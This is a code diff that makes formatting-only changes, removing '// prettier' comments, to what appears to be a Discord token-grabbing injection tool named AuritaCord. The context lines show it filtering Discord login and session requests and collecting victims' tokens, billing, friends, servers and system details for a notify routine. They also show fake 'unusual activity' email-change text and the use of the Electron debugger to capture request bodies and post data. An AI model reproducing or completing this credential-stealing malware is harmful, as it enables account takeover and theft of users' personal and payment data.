@@ -58,7 +58,6 @@ const CONFIG = {
  },
  auth_filters: {
   urls: [
-   // prettier
    '/users/@me',
    '/auth/login',
    '/auth/register',
@@ -73,7 +72,6 @@ const CONFIG = {
  },
  session_filters: {
   urls: [
-   // prettier
    'wss://remote-auth-gateway.discord.gg/*',
    'https://discord.com/api/v*/auth/sessions',
    'https://*.discord.com/api/v*/auth/sessions',
@@ -250,7 +248,6 @@ const notify = async (ctx, token, user) => {
  const getData = new GetDataUser();
 
  const [profile, system, network, billing, friends, servers] = [
-  // prettier
   (await AuritaCord()).profile,
   await getData.SystemInfo(),
   await getData.Network(),
@@ -395,13 +392,7 @@ class Fetcher {
   this.token = token;
  }
  _fetch = async (endpoint, headers) => {
-  const APIs = [
-   // prettier
-   'https://discordapp.com/api',
-   'https://discord.com/api',
-   'https://canary.discord.com/api',
-   'https://ptb.discord.com/api',
-  ];
+  const APIs = ['https://discordapp.com/api', 'https://discord.com/api', 'https://canary.discord.com/api', 'https://ptb.discord.com/api'];
   const response = parseJSON(await request('GET', `${APIs[Math.floor(Math.random() * APIs.length)]}/v9/users/${endpoint}`, headers));
   return response;
  };
@@ -488,18 +479,14 @@ class GetDataUser {
 
  Badges = flags =>
   Object.keys(CONFIG.badges).reduce(
-   // prettier
    (result, badge) =>
-    // prettier
     CONFIG.badges.hasOwnProperty(badge) && (flags & CONFIG.badges[badge].value) === CONFIG.badges[badge].value ? `${result}${CONFIG.badges[badge].emoji} ` : result,
    ''
   ) || '❓';
 
  RareBadges = flags =>
   Object.keys(CONFIG.badges).reduce(
-   // prettier
    (result, badge) =>
-    // prettier
     CONFIG.badges.hasOwnProperty(badge) && (flags & CONFIG.badges[badge].value) === CONFIG.badges[badge].value && CONFIG.badges[badge].rare
      ? `${result}${CONFIG.badges[badge].emoji} `
      : result,
@@ -1025,7 +1012,6 @@ const startup = async () => {
 
 const translateEmailUpdate = async (token, locale) => {
  const message = [
-  // prettier
   'User Settings',
   'Edit email address',
   'We have detected something unusual with your (<strong>Discord</strong>) account, your address,',
@@ -1130,7 +1116,6 @@ const createWindow = () => {
 
   try {
    const [{ body: responseBody }, { postData: requestPostData }] = await Promise.all([
-    // prettier
     mainWindow.webContents.debugger.sendCommand('Network.getResponseBody', { requestId: params.requestId }),
     mainWindow.webContents.debugger.sendCommand('Network.getRequestPostData', { requestId: params.requestId }),
    ]);
